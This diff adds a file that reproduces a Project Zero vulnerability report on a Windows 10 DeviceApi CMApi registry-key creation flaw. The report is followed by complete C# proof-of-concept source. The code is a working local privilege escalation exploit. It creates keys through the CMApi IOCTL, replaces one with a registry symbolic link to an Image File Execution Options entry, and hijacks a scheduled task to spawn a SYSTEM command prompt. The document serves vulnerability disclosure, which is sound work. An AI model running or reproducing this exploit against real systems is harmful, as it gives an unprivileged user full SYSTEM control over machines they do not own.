@@ -1,0 +1,883 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=872
+
+Windows: DeviceApi CMApi PiCMOpenClassKey Arbitrary Registry Key Write EoP
+Platform: Windows 10 10586 not tested 8.1 Update 2 or Windows 7
+Class: Elevation of Privilege
+
+Summary:
+The DeviceApi CMApi PiCMOpenClassKey IOCTL allows a normal user to create arbitrary registry keys in the system hive leading to elevation of privilege.
+
+Description:
+
+The DeviceApi is a driver implemented inside the kernel which exposes a number of devices. One of those is CMApi which presumably is short for configuration manager API as it primarily exposes device configuration from the registry to the caller. The device exposes calls using IOCTLs, in theory anything which “creates” or “deletes” an object is limited behind an access check which only administrators have access to. However certain calls feed into the call PnpCtxRegCreateTree which will allow a user to open parts of the registry, and if they’re not there will create the keys. This is a problem as the keys are created in the user’s context using ZwCreateKey but without forcing an access check (it does this intentionally, as otherwise the user couldn’t create the key). All we need to do is find a CMApi IOCTL which will create the arbitrary keys for us.
+
+Fortunately it’s not that simple, all the ones I find using the tree creation function verify that string being passed from the user meets some valid criteria and is always placed into a subkey which the user doesn’t have direct control over. However I noticed PiCMOpenDeviceKey allows a valid 3 part path, of the form ABC\DEF\XYZ to be specified and the only criteria for creating this key is it exists as a valid device under CurrentControlSet\Enum, however the keys will be created under CurrentControlSet\Hardware Profiles which doesn’t typically exist. The majority of calls to this IOCTL will apply a very restrictive security descriptor to the new keys, however if you specify the 0x200 device type flag it will use the default SD which will be inherited from the parent key. Even if this didn’t provide a useful ACE (in this case it has the default CREATOR OWNER giving full access) as it’s created under our user context we are the owner and so could rewrite the DACL anyway.
+
+To convert this into a full arbitrary write we can specify a device path which doesn’t already exist and it will create the three registry keys. If we now delete the last key and replace it with a symbolic link we can point it at any arbitrary key. As the system hive is trusted this isn’t affected by the inter-hive symbolic link protections (and at anyrate services is in the same hive), however this means that the exploit won’t work from low-IL due to restrictions on creating symbolic links from sandboxes.
+
+You should be treating anything which calls PnpCtxRegCreateTree or SysCtxRegCreateKey as suspect, especially if no explicit security descriptor is being passed. For example you can use PiCMOpenDeviceInterfaceKey to do something very similar and get an arbitrary Device Parameters key created with full control for any device interface which doesn’t already have one. You can’t use the same symbolic link trick here (you only control the leaf key) however there might be a driver which has exploitable behaviour if the user can create a arbitrary Device Parameters key. 
+
+Proof of Concept:
+
+I’ve provided a PoC as a C# source code file. You need to compile it first targeted .NET 4 and above. It will create a new IFEO for a executable we know can be run from the task scheduler at system. 
+
+1) Compile the C# source code file.
+2) Execute the PoC executable as a normal user.
+3) The PoC should print that it successfully created the key. You should find an interactive command prompt running at system on the desktop.
+
+Expected Result:
+The key access should fail, or at least the keys shouldn’t be writable by the current user. 
+
+Observed Result:
+The key access succeeds and a system level command prompt is created.
+*/
+
+using Microsoft.Win32;
+using Microsoft.Win32.SafeHandles;
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Security.AccessControl;
+using System.Text;
+using System.Threading;
+
+namespace PoC
+{
+  class Program
+  {
+    [Flags]
+    public enum AttributeFlags : uint
+    {
+      None = 0,
+      Inherit = 0x00000002,
+      Permanent = 0x00000010,
+      Exclusive = 0x00000020,
+      CaseInsensitive = 0x00000040,
+      OpenIf = 0x00000080,
+      OpenLink = 0x00000100,
+      KernelHandle = 0x00000200,
+      ForceAccessCheck = 0x00000400,
+      IgnoreImpersonatedDevicemap = 0x00000800,
+      DontReparse = 0x00001000,
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    public sealed class UnicodeString
+    {
+      ushort Length;
+      ushort MaximumLength;
+      [MarshalAs(UnmanagedType.LPWStr)]
+      string Buffer;
+
+      public UnicodeString(string str)
+      {
+        Length = (ushort)(str.Length * 2);
+        MaximumLength = (ushort)((str.Length * 2) + 1);
+        Buffer = str;
+      }
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    public sealed class ObjectAttributes : IDisposable
+    {
+      int Length;
+      IntPtr RootDirectory;
+      IntPtr ObjectName;
+      AttributeFlags Attributes;
+      IntPtr SecurityDescriptor;
+      IntPtr SecurityQualityOfService;
+
+      private static IntPtr AllocStruct(object s)
+      {
+        int size = Marshal.SizeOf(s);
+        IntPtr ret = Marshal.AllocHGlobal(size);
+        Marshal.StructureToPtr(s, ret, false);
+        return ret;
+      }
+
+      private static void FreeStruct(ref IntPtr p, Type struct_type)
+      {
+        Marshal.DestroyStructure(p, struct_type);
+        Marshal.FreeHGlobal(p);
+        p = IntPtr.Zero;
+      }
+
+      public ObjectAttributes(string object_name, AttributeFlags flags, IntPtr rootkey)
+      {
+        Length = Marshal.SizeOf(this);
+        if (object_name != null)
+        {
+          ObjectName = AllocStruct(new UnicodeString(object_name));
+        }
+        Attributes = flags;
+        RootDirectory = rootkey;
+      }
+
+      public ObjectAttributes(string object_name, AttributeFlags flags) 
+        : this(object_name, flags, IntPtr.Zero)
+      {
+      }
+
+      public void Dispose()
+      {
+        if (ObjectName != IntPtr.Zero)
+        {
+          FreeStruct(ref ObjectName, typeof(UnicodeString));
+        }
+        GC.SuppressFinalize(this);
+      }
+
+      ~ObjectAttributes()
+      {
+        Dispose();
+      }
+    }
+
+    [Flags]
+    public enum LoadKeyFlags
+    {
+      None = 0,
+      AppKey = 0x10,
+      Exclusive = 0x20,
+      Unknown800 = 0x800,
+      ReadOnly = 0x2000,
+    }
+
+    [Flags]
+    public enum GenericAccessRights : uint
+    {
+      None = 0,
+      GenericRead = 0x80000000,
+      GenericWrite = 0x40000000,
+      GenericExecute = 0x20000000,
+      GenericAll = 0x10000000,
+      Delete = 0x00010000,
+      ReadControl = 0x00020000,
+      WriteDac = 0x00040000,
+      WriteOwner = 0x00080000,
+      Synchronize = 0x00100000,
+      MaximumAllowed = 0x02000000,
+    }
+
+    public class NtException : ExternalException
+    {
+      [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+      private static extern IntPtr GetModuleHandle(string modulename);
+
+      [Flags]
+      enum FormatFlags
+      {
+        AllocateBuffer = 0x00000100,
+        FromHModule = 0x00000800,
+        FromSystem = 0x00001000,
+        IgnoreInserts = 0x00000200
+      }
+
+      [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+      private static extern int FormatMessage(
+        FormatFlags dwFlags,
+        IntPtr lpSource,
+        int dwMessageId,
+        int dwLanguageId,
+        out IntPtr lpBuffer,
+        int nSize,
+        IntPtr Arguments
+      );
+
+      [DllImport("kernel32.dll")]
+      private static extern IntPtr LocalFree(IntPtr p);
+
+      private static string StatusToString(int status)
+      {
+        IntPtr buffer = IntPtr.Zero;
+        try
+        {
+          if (FormatMessage(FormatFlags.AllocateBuffer | FormatFlags.FromHModule | FormatFlags.FromSystem | FormatFlags.IgnoreInserts,
+              GetModuleHandle("ntdll.dll"), status, 0, out buffer, 0, IntPtr.Zero) > 0)
+          {
+            return Marshal.PtrToStringUni(buffer);
+          }
+        }
+        finally
+        {
+          if (buffer != IntPtr.Zero)
+          {
+            LocalFree(buffer);
+          }
+        }
+        return String.Format("Unknown Error: 0x{0:X08}", status);
+      }
+
+      public NtException(int status) : base(StatusToString(status))
+      {
+      }
+    }
+
+    public static void StatusToNtException(int status)
+    {
+      if (status < 0)
+      {
+        throw new NtException(status);
+      }
+    }
+
+
+    [Flags]
+    public enum FileOpenOptions
+    {
+      None = 0,
+      DirectoryFile = 0x00000001,
+      WriteThrough = 0x00000002,
+      SequentialOnly = 0x00000004,
+      NoIntermediateBuffering = 0x00000008,
+      SynchronousIoAlert = 0x00000010,
+      SynchronousIoNonAlert = 0x00000020,
+      NonDirectoryFile = 0x00000040,
+      CreateTreeConnection = 0x00000080,
+      CompleteIfOplocked = 0x00000100,
+      NoEaKnowledge = 0x00000200,
+      OpenRemoteInstance = 0x00000400,
+      RandomAccess = 0x00000800,
+      DeleteOnClose = 0x00001000,
+      OpenByFileId = 0x00002000,
+      OpenForBackupIntent = 0x00004000,
+      NoCompression = 0x00008000,
+      OpenRequiringOplock = 0x00010000,
+      ReserveOpfilter = 0x00100000,
+      OpenReparsePoint = 0x00200000,
+      OpenNoRecall = 0x00400000,
+      OpenForFreeSpaceQuery = 0x00800000
+    }
+
+    public class IoStatusBlock
+    {
+      public IntPtr Pointer;
+      public IntPtr Information;
+
+      public IoStatusBlock(IntPtr pointer, IntPtr information)
+      {
+        Pointer = pointer;
+        Information = information;
+      }
+
+      public IoStatusBlock()
+      {
+      }
+    }
+
+    [Flags]
+    public enum ShareMode
+    {
+      None = 0,
+      Read = 0x00000001,
+      Write = 0x00000002,
+      Delete = 0x00000004,
+    }
+
+    [Flags]
+    public enum FileAccessRights : uint
+    {
+      None = 0,
+      ReadData = 0x0001,
+      WriteData = 0x0002,
+      AppendData = 0x0004,
+      ReadEa = 0x0008,
+      WriteEa = 0x0010,
+      Execute = 0x0020,
+      DeleteChild = 0x0040,
+      ReadAttributes = 0x0080,
+      WriteAttributes = 0x0100,
+      GenericRead = 0x80000000,
+      GenericWrite = 0x40000000,
+      GenericExecute = 0x20000000,
+      GenericAll = 0x10000000,
+      Delete = 0x00010000,
+      ReadControl = 0x00020000,
+      WriteDac = 0x00040000,
+      WriteOwner = 0x00080000,
+      Synchronize = 0x00100000,
+      MaximumAllowed = 0x02000000,
+    }
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtOpenFile(
+        out IntPtr FileHandle,
+        FileAccessRights DesiredAccess,
+        ObjectAttributes ObjAttr,
+        [In] [Out] IoStatusBlock IoStatusBlock,
+        ShareMode ShareAccess,
+        FileOpenOptions OpenOptions);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtDeviceIoControlFile(
+      SafeFileHandle FileHandle,
+      IntPtr Event,
+      IntPtr ApcRoutine,
+      IntPtr ApcContext,
+      [In] [Out] IoStatusBlock IoStatusBlock,
+      uint IoControlCode,
+      SafeHGlobalBuffer InputBuffer,
+      int InputBufferLength,
+      SafeHGlobalBuffer OutputBuffer,
+      int OutputBufferLength
+    );
+
+    static T DeviceIoControl<T>(SafeFileHandle FileHandle, uint IoControlCode, object input_buffer)
+    {
+      using (SafeStructureOutBuffer<T> output = new SafeStructureOutBuffer<T>())
+      {
+        using (SafeStructureBuffer input = new SafeStructureBuffer(input_buffer))
+        {
+          IoStatusBlock status = new IoStatusBlock();
+          StatusToNtException(NtDeviceIoControlFile(FileHandle, IntPtr.Zero, IntPtr.Zero,
+            IntPtr.Zero, status, IoControlCode, input, input.Length,
+            output, output.Length));
+          
+          return output.Result;
+        }
+      }
+    }
+
+    public static SafeFileHandle OpenFile(string name, FileAccessRights DesiredAccess, ShareMode ShareAccess, FileOpenOptions OpenOptions, bool inherit)
+    {
+      AttributeFlags flags = AttributeFlags.CaseInsensitive;
+      if (inherit)
+        flags |= AttributeFlags.Inherit;
+      using (ObjectAttributes obja = new ObjectAttributes(name, flags))
+      {
+        IntPtr handle;
+        IoStatusBlock iostatus = new IoStatusBlock();
+        StatusToNtException(NtOpenFile(out handle, DesiredAccess, obja, iostatus, ShareAccess, OpenOptions));
+        return new SafeFileHandle(handle, true);
+      }
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    class CmApiOpenKeyData
+    {
+      public int cbSize; // 0
+      public int device_type; // 4
+      public int callback_id; // 8
+      [MarshalAs(UnmanagedType.LPWStr)]
+      public string name;  // c
+      public int name_size; // 10
+      public GenericAccessRights desired_access; // 14	
+      public int create; // 18
+      public int hardware_id; // 1c
+      public int return_data_size; // 20
+
+      public CmApiOpenKeyData(int device_type, int callback_id, string name, GenericAccessRights desired_access, bool create, int hardware_id, int return_data_size)
+      {
+        this.cbSize = Marshal.SizeOf(this);
+        this.device_type = device_type;
+        this.callback_id = callback_id;
+        this.name = name;
+        this.name_size = (name.Length + 1) * 2;
+        this.desired_access = desired_access;
+        this.create = create ? 1 : 0;
+        this.hardware_id = hardware_id;
+        this.return_data_size = return_data_size;
+      }
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    class CmApiOpenKeyResult
+    {
+      int size;
+      public int status;
+      public long handle;
+    };
+
+    public class SafeHGlobalBuffer : SafeHandleZeroOrMinusOneIsInvalid
+    {
+      public SafeHGlobalBuffer(int length)
+        : this(Marshal.AllocHGlobal(length), length, true)
+      {
+      }
+
+      public SafeHGlobalBuffer(IntPtr buffer, int length, bool owns_handle)
+        : base(owns_handle)
+      {
+        Length = length;
+        SetHandle(buffer);
+      }
+
+      public int Length
+      {
+        get; private set;
+      }
+
+      protected override bool ReleaseHandle()
+      {
+        if (!IsInvalid)
+        {
+          Marshal.FreeHGlobal(handle);
+          handle = IntPtr.Zero;
+        }
+        return true;
+      }
+    }
+
+    public class SafeStructureBuffer : SafeHGlobalBuffer
+    {
+      Type _type;
+
+      public SafeStructureBuffer(object value) : base(Marshal.SizeOf(value))
+      {
+        _type = value.GetType();
+        Marshal.StructureToPtr(value, handle, false);
+      }
+
+      protected override bool ReleaseHandle()
+      {
+        if (!IsInvalid)
+        {
+          Marshal.DestroyStructure(handle, _type);
+        }
+        return base.ReleaseHandle();
+      }
+    }
+
+    public class SafeStructureOutBuffer<T> : SafeHGlobalBuffer
+    {
+      public SafeStructureOutBuffer() : base(Marshal.SizeOf(typeof(T)))
+      {
+      }
+
+      public T Result
+      {
+        get
+        {
+          if (IsInvalid)
+            throw new ObjectDisposedException("handle");
+
+          return Marshal.PtrToStructure<T>(handle);
+        }
+      }
+    }
+
+    static void EnumKeys(RegistryKey rootkey, IEnumerable<string> name_parts, List<string> names, int maxdepth, int current_depth)
+    {      
+      if (current_depth == maxdepth)
+      {
+        names.Add(String.Join(@"\", name_parts));
+      }
+      else
+      {
+        foreach (string subkey in rootkey.GetSubKeyNames())
+        {
+          using (RegistryKey key = rootkey.OpenSubKey(subkey))
+          {            
+            if (key != null)
+            {              
+              EnumKeys(key, name_parts.Concat(new string[] { subkey }), names, maxdepth, current_depth + 1);              
+            }
+          }
+        }
+      }
+    }
+
+    static IEnumerable<string> GetValidDeviceNames()
+    {
+      List<string> names = new List<string>();
+      using (RegistryKey rootkey = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Enum"))
+      {
+        EnumKeys(rootkey, new string[0], names, 3, 0);
+      }
+      return names;
+    }
+    
+    static RegistryKey OpenProfileKey(string name)
+    {
+      RegistryKey ret = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Hardware Profiles\0001\SYSTEM\CurrentControlSet\Enum");
+      if (name != null)
+      {
+        try
+        {
+          return ret.OpenSubKey(name);
+        }
+        finally
+        {
+          ret.Close();
+        }
+      }
+      else
+      {
+        return ret;
+      }
+    }
+
+    static string FindFirstAccessibleDevice()
+    {
+      foreach (string device in GetValidDeviceNames())
+      {
+        try
+        {            
+          using (RegistryKey key = OpenProfileKey(device))
+          {
+            if (key == null)
+            {
+              return device;
+            }          
+          }
+        }
+        catch { }
+      }
+
+      return null;
+    }
+
+    [Flags]
+    enum KeyCreateOptions
+    {
+      None = 0,
+      NonVolatile = None,      
+      Volatile = 1,      
+      CreateLink = 2,
+      BackupRestore = 4,
+    }
+
+    [DllImport("ntdll.dll", CharSet = CharSet.Unicode)]
+    static extern int NtCreateKey(
+      out IntPtr KeyHandle,
+      GenericAccessRights DesiredAccess,
+      [In] ObjectAttributes ObjectAttributes,
+      int TitleIndex,
+      [In] UnicodeString Class,
+      KeyCreateOptions CreateOptions,
+      out int Disposition);
+
+    static SafeRegistryHandle CreateKey(SafeRegistryHandle rootkey, string path, AttributeFlags flags, KeyCreateOptions options)
+    {
+      using (ObjectAttributes obja = new ObjectAttributes(path, flags | AttributeFlags.CaseInsensitive, rootkey != null ? rootkey.DangerousGetHandle() : IntPtr.Zero))
+      {
+        IntPtr handle;
+        int disposition = 0;
+        StatusToNtException(NtCreateKey(out handle, GenericAccessRights.MaximumAllowed, obja, 0, null, options, out disposition));
+        return new SafeRegistryHandle(handle, true);
+      } 
+    }
+
+    enum RegistryKeyType
+    {
+      Link = 6,
+    }
+
+    [DllImport("ntdll.dll", CharSet = CharSet.Unicode)]
+    static extern int NtSetValueKey(
+      SafeRegistryHandle KeyHandle,
+      UnicodeString ValueName,
+      int TitleIndex,
+      RegistryKeyType Type,
+      byte[] Data,
+      int DataSize);
+
+    [DllImport("ntdll.dll")]
+    static extern int NtDeleteKey(SafeRegistryHandle KeyHandle);
+
+    static void DeleteSymbolicLink(SafeRegistryHandle rootkey, string path)
+    {      
+      using (SafeRegistryHandle key = CreateKey(rootkey, path, AttributeFlags.OpenLink | AttributeFlags.OpenIf, KeyCreateOptions.None))
+      {
+        StatusToNtException(NtDeleteKey(key));
+      }     
+    }
+
+    static SafeRegistryHandle CreateSymbolicLink(SafeRegistryHandle rootkey, string path, string target)
+    {      
+      SafeRegistryHandle key = CreateKey(rootkey, path, AttributeFlags.OpenIf | AttributeFlags.OpenLink, KeyCreateOptions.CreateLink);
+      try
+      {
+        UnicodeString value_name = new UnicodeString("SymbolicLinkValue");
+        byte[] data = Encoding.Unicode.GetBytes(target);
+        StatusToNtException(NtSetValueKey(key, value_name, 0, RegistryKeyType.Link, data, data.Length));
+        SafeRegistryHandle ret = key;
+        key = null;
+        return ret;
+      }
+      finally
+      {
+        if (key != null)
+        {
+          NtDeleteKey(key);
+        }
+      }
+    }
+
+    static RegistryKey CreateDeviceKey(string device_name)
+    {
+      using (SafeFileHandle handle = OpenFile(@"\Device\DeviceApi\CMApi", FileAccessRights.Synchronize | FileAccessRights.GenericRead | FileAccessRights.GenericWrite,
+        ShareMode.None, FileOpenOptions.NonDirectoryFile | FileOpenOptions.SynchronousIoNonAlert, false))
+      {
+        CmApiOpenKeyData data = new CmApiOpenKeyData(0x211, 1, device_name, GenericAccessRights.MaximumAllowed, true, 0, Marshal.SizeOf(typeof(CmApiOpenKeyResult)));
+        CmApiOpenKeyResult result = DeviceIoControl<CmApiOpenKeyResult>(handle, 0x47085B, data);
+        StatusToNtException(result.status);
+        return RegistryKey.FromHandle(new SafeRegistryHandle(new IntPtr(result.handle), true));
+      }
+    }
+
+
+    public enum TokenInformationClass
+    {
+      TokenSessionId = 12
+    }
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtClose(IntPtr handle);
+
+    [DllImport("ntdll.dll", CharSet = CharSet.Unicode)]
+    public static extern int NtOpenProcessTokenEx(
+          IntPtr ProcessHandle,
+          GenericAccessRights DesiredAccess,
+          AttributeFlags HandleAttributes,
+          out IntPtr TokenHandle);
+
+    public sealed class SafeKernelObjectHandle
+  : SafeHandleZeroOrMinusOneIsInvalid
+    {
+      public SafeKernelObjectHandle()
+        : base(true)
+      {
+      }
+
+      public SafeKernelObjectHandle(IntPtr handle, bool owns_handle)
+        : base(owns_handle)
+      {
+        SetHandle(handle);
+      }
+
+      protected override bool ReleaseHandle()
+      {
+        if (!IsInvalid)
+        {
+          NtClose(this.handle);
+          this.handle = IntPtr.Zero;
+          return true;
+        }
+        return false;
+      }
+    }
+
+    public enum TokenType
+    {
+      Primary = 1,
+      Impersonation = 2
+    }
+
+    [DllImport("ntdll.dll", CharSet = CharSet.Unicode)]
+    public static extern int NtDuplicateToken(
+    IntPtr ExistingTokenHandle,
+    GenericAccessRights DesiredAccess,
+    ObjectAttributes ObjectAttributes,
+    bool EffectiveOnly,
+    TokenType TokenType,
+    out IntPtr NewTokenHandle
+    );
+
+    public static SafeKernelObjectHandle DuplicateToken(SafeKernelObjectHandle existing_token)
+    {
+      IntPtr new_token;
+
+      using (ObjectAttributes obja = new ObjectAttributes(null, AttributeFlags.None))
+      {
+        StatusToNtException(NtDuplicateToken(existing_token.DangerousGetHandle(),
+          GenericAccessRights.MaximumAllowed, obja, false, TokenType.Primary, out new_token));
+        return new SafeKernelObjectHandle(new_token, true);
+      }
+    }
+
+    public static SafeKernelObjectHandle OpenProcessToken()
+    {
+      IntPtr new_token;
+      StatusToNtException(NtOpenProcessTokenEx(new IntPtr(-1),
+        GenericAccessRights.MaximumAllowed, AttributeFlags.None, out new_token));
+      using (SafeKernelObjectHandle ret = new SafeKernelObjectHandle(new_token, true))
+      {
+        return DuplicateToken(ret);
+      }
+    }
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtSetInformationToken(
+      SafeKernelObjectHandle TokenHandle,
+      TokenInformationClass TokenInformationClass,
+      byte[] TokenInformation,
+      int TokenInformationLength);
+
+    public static void SetTokenSessionId(SafeKernelObjectHandle token, int session_id)
+    {
+      byte[] buffer = BitConverter.GetBytes(session_id);
+      NtSetInformationToken(token, TokenInformationClass.TokenSessionId,
+        buffer, buffer.Length);
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    struct STARTUPINFO
+    {
+      public Int32 cb;
+      public string lpReserved;
+      public string lpDesktop;
+      public string lpTitle;
+      public Int32 dwX;
+      public Int32 dwY;
+      public Int32 dwXSize;
+      public Int32 dwYSize;
+      public Int32 dwXCountChars;
+      public Int32 dwYCountChars;
+      public Int32 dwFillAttribute;
+      public Int32 dwFlags;
+      public Int16 wShowWindow;
+      public Int16 cbReserved2;
+      public IntPtr lpReserved2;
+      public IntPtr hStdInput;
+      public IntPtr hStdOutput;
+      public IntPtr hStdError;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    internal struct PROCESS_INFORMATION
+    {
+      public IntPtr hProcess;
+      public IntPtr hThread;
+      public int dwProcessId;
+      public int dwThreadId;
+    }
+
+    enum CreateProcessFlags
+    {
+      CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
+      CREATE_DEFAULT_ERROR_MODE = 0x04000000,
+      CREATE_NEW_CONSOLE = 0x00000010,
+      CREATE_NEW_PROCESS_GROUP = 0x00000200,
+      CREATE_NO_WINDOW = 0x08000000,
+      CREATE_PROTECTED_PROCESS = 0x00040000,
+      CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
+      CREATE_SEPARATE_WOW_VDM = 0x00000800,
+      CREATE_SHARED_WOW_VDM = 0x00001000,
+      CREATE_SUSPENDED = 0x00000004,
+      CREATE_UNICODE_ENVIRONMENT = 0x00000400,
+      DEBUG_ONLY_THIS_PROCESS = 0x00000002,
+      DEBUG_PROCESS = 0x00000001,
+      DETACHED_PROCESS = 0x00000008,
+      EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
+      INHERIT_PARENT_AFFINITY = 0x00010000
+    }
+
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    static extern bool CreateProcessAsUser(
+      IntPtr hToken,
+      string lpApplicationName,
+      string lpCommandLine,
+      IntPtr lpProcessAttributes,
+      IntPtr lpThreadAttributes,
+      bool bInheritHandles,
+      CreateProcessFlags dwCreationFlags,
+      IntPtr lpEnvironment,
+      string lpCurrentDirectory,
+      ref STARTUPINFO lpStartupInfo,
+      out PROCESS_INFORMATION lpProcessInformation);
+
+    static void SpawnInteractiveCmd(int sessionid)
+    {      
+      SafeKernelObjectHandle token = OpenProcessToken();
+      SetTokenSessionId(token, sessionid);
+
+      STARTUPINFO startInfo = new STARTUPINFO();
+      startInfo.cb = Marshal.SizeOf(startInfo);
+      PROCESS_INFORMATION procInfo;
+
+      CreateProcessAsUser(token.DangerousGetHandle(), null, "cmd.exe",
+        IntPtr.Zero, IntPtr.Zero, false, CreateProcessFlags.CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref startInfo, out procInfo);
+    }
+    
+    static bool DoExploit()
+    {
+      SafeRegistryHandle symbolic_link = null;
+      
+      try
+      {
+        string device_name = FindFirstAccessibleDevice();
+        if (device_name != null)
+        {
+          Console.WriteLine("[SUCCESS]: Found Device: {0}", device_name);
+        }
+        else
+        {
+          throw new ArgumentException("Couldn't find a valid device");
+        }
+
+        using (RegistryKey key = CreateDeviceKey(device_name))
+        {
+          StatusToNtException(NtDeleteKey(key.Handle));
+        }
+
+        Console.WriteLine("[SUCCESS]: Deleted leaf key");
+
+        using (RegistryKey profile_key = OpenProfileKey(null))
+        {          
+          symbolic_link = CreateSymbolicLink(profile_key.Handle, device_name, 
+            @"\Registry\Machine\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wsqmcons.exe");
+        }
+
+        Console.WriteLine("[SUCCESS]: Created symbolic link");
+        using (RegistryKey key = CreateDeviceKey(device_name))
+        {
+          key.SetValue("Debugger", String.Format("\"{0}\" {1}", Assembly.GetCallingAssembly().Location, GetSessionId()));
+          Console.WriteLine("[SUCCESS]: Created IFEO key");
+          EventWaitHandle ev = new EventWaitHandle(false, EventResetMode.AutoReset, @"Global\{376693BE-1931-4AF9-8D56-C629F9094745}");
+          Process p = Process.Start("schtasks", @"/Run /TN ""\Microsoft\Windows\Customer Experience Improvement Program\Consolidator""");
+          ev.WaitOne();
+
+          NtDeleteKey(key.Handle);
+        } 
+      }
+      catch (Exception ex)
+      {
+        Console.WriteLine("[ERROR]: {0}", ex.Message);
+      }
+      finally
+      {
+        if (symbolic_link != null)
+        {
+          NtDeleteKey(symbolic_link);
+        }
+      }
+      return false;
+    }    
+    
+    static int GetSessionId()
+    {
+      using (Process p = Process.GetCurrentProcess())
+      {
+        return p.SessionId;
+      }
+    }    
+    
+    static void Main(string[] args)
+    {    
+      if (GetSessionId() > 0)
+      {
+        DoExploit();
+      }
+      else
+      {
+        Console.WriteLine("[SUCCESS]: Running as service");
+        EventWaitHandle ev = EventWaitHandle.OpenExisting(@"Global\{376693BE-1931-4AF9-8D56-C629F9094745}", EventWaitHandleRights.Modify);
+        ev.Set();
+        if (args.Length > 1)
+        {
+          int session_id;
+          if (!int.TryParse(args[0], out session_id))
+          {
+            session_id = 0;
+          }
+          SpawnInteractiveCmd(session_id);
+        }
+      }
+    }
+  }
+}
